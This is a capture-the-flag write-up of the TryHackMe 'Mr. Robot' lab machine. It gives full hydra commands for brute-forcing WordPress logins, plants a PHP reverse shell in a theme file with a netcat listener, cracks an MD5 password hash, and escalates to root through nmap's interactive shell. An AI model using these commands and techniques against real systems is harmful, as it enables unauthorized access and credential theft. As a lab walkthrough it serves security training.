# THM - Mr. Robot

A write-up to the `Mr. Robot` machine provided by [TryHackMe](https://tryhackme.com/). This machine is rated as a `Medium` difficulty... Let's get to it.

## Recon
Running an nmap scan for first recon on this room to see what ports are open, what services are running on it... etc
```

... what comes next is not so technical... while `gobuster` was running I started clicking stuff around and trying to access pages here and there... and I ended up on a `Wordpress` 404 page. After this I took a look at gobuster and what do you know, we have `/wp-content` and other Wordpress related paths.

`gobuster` also returned a `/robots` path which after accessing is just the `/robots.txt` file.
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Looks like we got our first key.

`fsocity.dic` seems to be a custom word dictionary that might be usefull to us so we will download it on our machine using `wget`

WPScan revealed a good detail about this web app
```
# using 2015 theme
WordPress theme in use: twentyfifteen
 | Location: http://10.10.42.60/wp-content/themes/twentyfifteen/
```

## Foothold

Since there's not much else to go on from here and I already am under the impression that we'll have to reverse shell our way in from the Wordpress theme it's time to `brute force` our way in.

### Username

We don't know what username we need to use so we will have to brutefoce that also... using the dictionary kindly provided by the web app: `fsocity.dic`

```
hydra -L fsocity.dic -p test 10.10.42.60 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fmrrobot.thm%2Fwp-admin%2F&testcookie=1:F=Invalid username"
```
- we will use `fsocity.dic` to check for possible usernames
- we will be looking for an _incorrect password_ message to know we have the right user


After running for a bit we have our user:
```
[80][http-post-form] host: 10.10.42.60   login: Elliot   password: test
```

Now it's time to try and bruteforce the password... one good tip I received here was to filter out the dictionary for duplicates and entries that wouldn't match a password cryteria (a minimum of x character)


```
hydra -l Elliot -P fsocity.dic2 10.10.42.60 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fmrrobot.thm%2Fwp-admin%2F&testcookie=1:S=302"
```

After a _long time_ we get the password and we can now login in the wordpress app.


## Exploit

I looked around the Wordpress dashboard and couldn't find anything interesting... other then the fact that Elliot's therapist is subscribed to his blog.

I used PentestMonkey's [PHP Reverse Shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) to add it do the 404.php code of Wordpress theme and accessed a random page that would return a 404 error.


```
$ nc -lnvp 8585
listening on [any] 8585 ...

```
We're in... time to upgrade this shell to something _nicer_, I would say that I used my own [Cheatsheet](https://7a336e6e.github.io/posts/pentest-cheatsheet/#upgrading-a-reverse-shell) for this but the reality is that I've done this thing so many times that I know it _by heart_

## 2nd Flag

Manual _enumeration_ revealed this system has a user `robot` and his `/home` has a few interesting files:
```
daemon@linux:/home/robot$ ls -la
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

Now we can't read `key-2-of-3.txt` unfortunately...yet. But we can read `password.raw-md5`

```
daemon@linux:/home/robot$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Here we can either ask John to do our work for us or use Hashcat, it's up to your own choice and prefferences... but we get the password for `robot` and therefore we get `key-2-of-3`


## Privesc

In order for us to get the 3rd and final flag we need to escalate our privileges to `root`, which I assume has the 3rd and final flag.

Now I had a bit of a hard time to find a place to get `linpeas.sh` as this user's `/home` was owned by root and we didn't have write access to it... bummer~

I managed to find a nice and cozy place in `/var/run/shm` where I downloaded `linpeas.sh` from my own machine and executed it.

Now running linpeas we see the ubuntu version is being flagged right away with the _RED/YELLOW_ marker as a _99% PE vector_ ... which it might be, but the way to root is far more easy... Just a few more lines below we see that our user can execute `nmap`. We can open an interactive nmap shell from which we can switch to a `root` shell and therefore get our final flag.

```
robot@linux:/var/run/shm$ nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
# whoami

# cd /root
# ls -la

-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
-rw-------  1 root root 1024 Sep 16  2015 .rnd
```

And we got our 3rd and final key and this box is **OWNED**
